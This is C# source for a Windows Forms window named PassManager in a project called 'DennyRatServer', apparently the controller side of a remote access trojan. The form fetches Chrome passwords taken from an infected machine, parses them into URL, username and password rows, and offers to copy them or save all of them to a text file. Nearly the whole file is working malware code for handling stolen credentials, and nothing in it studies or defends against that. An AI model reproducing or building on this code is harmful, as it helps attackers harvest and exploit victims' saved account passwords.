using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DennyRatServer
{
    public partial class PassManager : Form
    {
        int myind;
        Form1 parentform;

        public PassManager(int myid, Form1 par)
        {
            InitializeComponent();
            parentform = par;
            myind = myid;
        }

        private void passwordsGotten(string passes)
        {
            string[] spasses = passes.Split(new string[] { "::::" }, StringSplitOptions.RemoveEmptyEntries);
            foreach(string spass in spasses)
            {
                string[] passparams = spass.Split(new string[] { ":::" }, StringSplitOptions.None);
                if(passparams.Length == 3)
                {
                    if (!passparams[2].StartsWith("Password could not be retrieved"))
                    {
                        ListViewItem itm = new ListViewItem(passparams[0]);
                        itm.SubItems.Add(passparams[1]);
                        itm.SubItems.Add(passparams[2]);
                        listView1.Items.Add(itm);
                    }
                }

            }

            Controls.Remove(label1);

            /*
            Controls.Remove(label1);
            Console.WriteLine(passes);
            string rlpasses1 = passes.Split(new string[] { "startingshiincmd" }, StringSplitOptions.None)[1];
            foreach (var splitpass in rlpasses1.Split(new string[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries)) 
            {
                if (splitpass.StartsWith("URL"))
                {
                    string[] eachpass = splitpass.Split(new string[] { "::" }, StringSplitOptions.None);
                    ListViewItem item = new ListViewItem(eachpass);
                    listView1.Items.Add(item);
                }
            }*/
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            lookForPasses();
        }

        void lookForPasses()
        {
            string stre = parentform.GetChromePasses(myind);
            passwordsGotten(stre);
            timer1.Enabled = false;
        }

        private void copyRowToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                ListViewItem item = listView1.SelectedItems[0];
                Clipboard.SetText("URL: " + item.Text + "   Username: " + item.SubItems[1].Text + "   Password: " + item.SubItems[2].Text);
            }
            else
            {
                MessageBox.Show("Nothing selected");
            }
        }

        private void saveEverythingToFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string outputstring = "";
            foreach(ListViewItem item in listView1.Items)
            {
                outputstring = outputstring + ("URL: " + item.Text + "   Username: " + item.SubItems[1].Text + "   Password: " + item.SubItems[2].Text) + Environment.NewLine;
            }

            System.Windows.Forms.SaveFileDialog saveFileDialog1;
            saveFileDialog1 = new System.Windows.Forms.SaveFileDialog();
            saveFileDialog1.DefaultExt = "txt";
            DialogResult dr = saveFileDialog1.ShowDialog();
            if (dr == DialogResult.OK)
            {
                string filename = saveFileDialog1.FileName;
                File.WriteAllText(filename, outputstring);
                //save file using stream.
            }
        }
    }
}
